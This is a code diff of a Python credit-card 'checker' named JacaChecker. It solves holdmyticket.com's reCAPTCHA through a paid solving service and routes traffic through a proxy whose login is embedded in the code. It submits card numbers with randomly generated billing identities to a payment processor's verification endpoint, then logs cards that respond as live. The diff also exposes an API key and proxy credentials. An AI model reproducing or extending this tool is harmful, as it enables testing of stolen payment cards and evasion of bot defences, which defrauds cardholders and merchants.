@@ -19,28 +19,28 @@ CORS(app)
 def pegarItem(data, esquerda, direita):
     return data.partition(esquerda)[-1].partition(direita)[0]
 
-def criarTask():
-    data = {
-        "clientKey": "86f80f989d5d3d9f84ed15a70dcd8a39",
-        "task": {
-            "type": "RecaptchaV2EnterpriseTask",
-            "websiteURL": "https://holdmyticket.com/api/shop/processors/logme2342311",
-            "websiteKey": "6Lf7DLEZAAAAACWoTmGDsOAzTTwXshPMYKQMcrxK",
-        },
-    }
-    criar = requests.post(
-        "https://api.capmonster.cloud/createTask", verify=False, json=data
-    )
-    taskId = criar.json()["taskId"]
-    while True:
-        data = {"clientKey": "86f80f989d5d3d9f84ed15a70dcd8a39", "taskId": taskId}
-        resultado = requests.post(
-            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
-        )
-        #print(resultado.text)
-        if '"status":"ready"' in resultado.text:
-            return resultado.json()["solution"]["gRecaptchaResponse"]
-        time.sleep(1)
+# def criarTask():
+#     data = {
+#         "clientKey": "86f80f989d5d3d9f84ed15a70dcd8a39",
+#         "task": {
+#             "type": "RecaptchaV2EnterpriseTask",
+#             "websiteURL": "https://holdmyticket.com/api/shop/processors/logme2342311",
+#             "websiteKey": "6Lf7DLEZAAAAACWoTmGDsOAzTTwXshPMYKQMcrxK",
+#         },
+#     }
+#     criar = requests.post(
+#         "https://api.capmonster.cloud/createTask", verify=False, json=data
+#     )
+#     taskId = criar.json()["taskId"]
+#     while True:
+#         data = {"clientKey": "86f80f989d5d3d9f84ed15a70dcd8a39", "taskId": taskId}
+#         resultado = requests.post(
+#             "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
+#         )
+#         #print(resultado.text)
+#         if '"status":"ready"' in resultado.text:
+#             return resultado.json()["solution"]["gRecaptchaResponse"]
+#         time.sleep(1)
 
 def api_bin(bin):
     try:
@@ -90,6 +90,31 @@ def definir_tipo_cartao(card):
         return "Desconhecido"
     
     
+def criarTask():
+    data = {
+        "clientKey": "86f80f989d5d3d9f84ed15a70dcd8a39",
+        "task": {
+            "type": "RecaptchaV2EnterpriseTask",
+            "websiteURL": "https://holdmyticket.com/api/shop/processors/logme2342311",
+            "websiteKey": "6Lf7DLEZAAAAACWoTmGDsOAzTTwXshPMYKQMcrxK",
+        },
+    }
+    criar = requests.post(
+        "https://api.capmonster.cloud/createTask", verify=False, json=data
+    )
+    taskId = criar.json()["taskId"]
+    while True:
+        data = {"clientKey": "86f80f989d5d3d9f84ed15a70dcd8a39", "taskId": taskId}
+        resultado = requests.post(
+            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
+        )
+        #print(resultado.text)
+        if '"status":"ready"' in resultado.text:
+            return resultado.json()["solution"]["gRecaptchaResponse"]
+        time.sleep(1)
+    
+    
+    
 def checker(card, month, year, cvv):
         
         
@@ -128,115 +153,112 @@ def checker(card, month, year, cvv):
             tel = random.randint(00000,99999)
             
             if response.status_code == 200:
-                try:
+          
             
             
-                    p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225'}
-                    start_time = time.time() 
-                    recap = criarTask()
-            
-            
-            
-            
-            
-                            
-                    url = f"https://holdmyticket.com/api/shop/processors/get_authentication_key?captcha_token={recap}"
+                p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225'}
+                start_time = time.time() 
+                recap = criarTask()
+        
+        
+        
+        
+        
+                        
+                url = f"https://holdmyticket.com/api/shop/processors/get_authentication_key?captcha_token={recap}"
 
-                    payload = {}
-                    headers = {
-                    'Host': 'holdmyticket.com',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-                    'Accept': '*/*',
-                    'Origin': 'https://tickets.holdmyticket.com',
-                    'Referer': 'https://tickets.holdmyticket.com/',
-                    #'Cookie': '_fbp=fb.1.1712014315500.1863181539; PHPSESSID=0b5fb7f955ebe8f673edd97fa4fd3a97; _gid=GA1.2.219304938.1712270413; _gat=1; _ga=GA1.1.1072852156.1712014452; _ga_6BRBZCZGJH=GS1.2.1712270413.3.1.1712270597.41.0.0; _ga_4Y1SMXCRK4=GS1.1.1712270413.3.1.1712270612.0.0.0'
-                    }
+                payload = {}
+                headers = {
+                'Host': 'holdmyticket.com',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+                'Accept': '*/*',
+                'Origin': 'https://tickets.holdmyticket.com',
+                'Referer': 'https://tickets.holdmyticket.com/',
+                #'Cookie': '_fbp=fb.1.1712014315500.1863181539; PHPSESSID=0b5fb7f955ebe8f673edd97fa4fd3a97; _gid=GA1.2.219304938.1712270413; _gat=1; _ga=GA1.1.1072852156.1712014452; _ga_6BRBZCZGJH=GS1.2.1712270413.3.1.1712270597.41.0.0; _ga_4Y1SMXCRK4=GS1.1.1712270413.3.1.1712270612.0.0.0'
+                }
 
-                    response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, timeout=40)
-                    
-                    auth_key = response.json()['authenticationKey']
-
-
-                    url = "https://api.fullsteampay.net/api/token/card/clearText/create"
-
-                    payload = {
-                        "clearTextCardData": {
-                            "cardNumber": card,
-                            "cvv": "",
-                            "expirationMonth": month,
-                            "expirationYear": year,
-                            "billingInformation": {
-                                "nameOnAccount": f"{nome} {sobrenome}",
-                                "firstName": nome,
-                                "lastName": sobrenome,
-                                "address1": f"{snumber} {street}",
-                                "address2": None,
-                                "city": city,
-                                "state": state,
-                                "zip": postcode,
-                                "country": "US",
-                                "phone": f"{tel}00092",
-                                "email": email
-                            }
-                        },
-                        "cardEntryContext": 5,
-                        "performAccountVerification": True
-                    }
-                    headers = {
-                    'Host': 'api.fullsteampay.net',
-                    'processor-compat-ver': '1',
-                    'content-type': 'application/json;charset=UTF-8',
-                    'authenticationkey': auth_key,
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-                    'accept': '*/*',
-                    'origin': 'https://tickets.holdmyticket.com',
-                    'referer': 'https://tickets.holdmyticket.com/',
-                    'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
-                    }
-
-                    response = requests.request("POST", url, headers=headers, json=payload, verify=False, proxies=p, timeout=40)
-                    elapsed_time = time.time() - start_time
+                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, timeout=40)
                 
-                    MSegundos = round(elapsed_time, 2)
-                    
-                    if 'Retry Transaction' in response.text:
-                        code = response.json()['issuerResponseDetails']['issuerResponseCode']
-                        bin = api_bin(card[:6])              
-                        x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry {code} [{MSegundos}] MS"                          
-                        open("holdmyticket.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry {code} [{MSegundos}] #JacaChecker\n")
-                        print(Fore.GREEN + f"Live: {x} #JacaChecker")     
-                        return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
-                    
-                    elif 'issuerResponseCode":"85"' in response.text:
-                        code = response.json()['issuerResponseDetails']['issuerResponseCode']
-                        bin = api_bin(card[:6])              
-                        x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS {code} [{MSegundos}] MS"                          
-                        open("holdmyticket.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} AVS {code} [{MSegundos}] #JacaChecker\n") 
-                        print(Fore.GREEN + f"{x} #JacaChecker") 
-                        return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
-                        
-                    elif 'issuerResponseCode":"46"' in response.text:
-                        code = response.json()['issuerResponseDetails']['issuerResponseCode']
-                        bin = api_bin(card[:6])              
-                        x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Closed {code} [{MSegundos}] MS"                          
-                        print(Fore.RED + f"{x} #JacaChecker")  
-                        return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
-                        
-                            
-                    elif 'issuerResponseDetails' in response.text:
-                        response = response.json()['issuerResponseDetails']['issuerResponseDescription']
-                        bin = api_bin(card[:6])
-                        x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response} [{MSegundos}] MS"     
-                        print(Fore.RED + f"{x} #JacaChecker")  
-                        return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}                       
+                auth_key = response.json()['authenticationKey']
 
-                    else:
+
+                url = "https://api.fullsteampay.net/api/token/card/clearText/create"
+
+                payload = {
+                    "clearTextCardData": {
+                        "cardNumber": card,
+                        "cvv": "",
+                        "expirationMonth": month,
+                        "expirationYear": year,
+                        "billingInformation": {
+                            "nameOnAccount": f"{nome} {sobrenome}",
+                            "firstName": nome,
+                            "lastName": sobrenome,
+                            "address1": f"{snumber} {street}",
+                            "address2": None,
+                            "city": city,
+                            "state": state,
+                            "zip": postcode,
+                            "country": "US",
+                            "phone": f"{tel}00092",
+                            "email": email
+                        }
+                    },
+                    "cardEntryContext": 5,
+                    "performAccountVerification": True
+                }
+                headers = {
+                'Host': 'api.fullsteampay.net',
+                'processor-compat-ver': '1',
+                'content-type': 'application/json;charset=UTF-8',
+                'authenticationkey': auth_key,
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+                'accept': '*/*',
+                'origin': 'https://tickets.holdmyticket.com',
+                'referer': 'https://tickets.holdmyticket.com/',
+                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
+                }
+
+                response = requests.request("POST", url, headers=headers, json=payload, verify=False, proxies=p, timeout=40)
+                elapsed_time = time.time() - start_time
+            
+                MSegundos = round(elapsed_time, 2)
+                
+                if 'Retry Transaction' in response.text:
+                    code = response.json()['issuerResponseDetails']['issuerResponseCode']
+                    bin = api_bin(card[:6])              
+                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry {code} [{MSegundos}] MS"                          
+                    open("holdmyticket.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry {code} [{MSegundos}] #JacaChecker\n")
+                    print(Fore.GREEN + f"Live: {x} #JacaChecker")     
+                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
+                
+                elif 'issuerResponseCode":"85"' in response.text:
+                    code = response.json()['issuerResponseDetails']['issuerResponseCode']
+                    bin = api_bin(card[:6])              
+                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS {code} [{MSegundos}] MS"                          
+                    open("holdmyticket.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} AVS {code} [{MSegundos}] #JacaChecker\n") 
+                    print(Fore.GREEN + f"{x} #JacaChecker") 
+                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
+                    
+                elif 'issuerResponseCode":"46"' in response.text:
+                    code = response.json()['issuerResponseDetails']['issuerResponseCode']
+                    bin = api_bin(card[:6])              
+                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Closed {code} [{MSegundos}] MS"                          
+                    print(Fore.RED + f"{x} #JacaChecker")  
+                    return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
+                    
                         
-                        print(Fore.RED + 'Consultar Adm !')
-                        return {"code": 2, "mensagem": f"Consultar adm #JacaChecker<br>"}
-                except:
-                    print("CONTATAR ADMMMMMMMMMMM !!!!")
-                    return "CONTATAR ADMMMMMMMMMMM !!!!"        
+                elif 'issuerResponseDetails' in response.text:
+                    response = response.json()['issuerResponseDetails']['issuerResponseDescription']
+                    bin = api_bin(card[:6])
+                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response} [{MSegundos}] MS"     
+                    print(Fore.RED + f"{x} #JacaChecker")  
+                    return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}                       
+
+                else:
+                    
+                    print(Fore.RED + 'Consultar Adm !')
+                    return {"code": 2, "mensagem": f"Consultar adm #JacaChecker<br>"}     
 
                     
         except requests.exceptions.ProxyError:
@@ -253,6 +275,7 @@ def checker(card, month, year, cvv):
             print(Fore.LIGHTWHITE_EX + f"RETESTANDO Location: {card}|{month}|{year}|{cvv}")
             reteste(card, month, year, cvv)
 
+
 def processar_cartoes(card,mes,ano,cvv):
     try:
         if len(card) == 16 or len(card) == 15 and mes and ano and cvv:
@@ -261,7 +284,6 @@ def processar_cartoes(card,mes,ano,cvv):
         else:
             return {"code": "", "retorno": "erro no formulario"}
     except:
-        #retorno = reteste(card,mes,ano,cvv)
         return {"code": "", "retorno": "EXCEPTION ! CONTATE ADM SE PERSISTIR"}
     
     
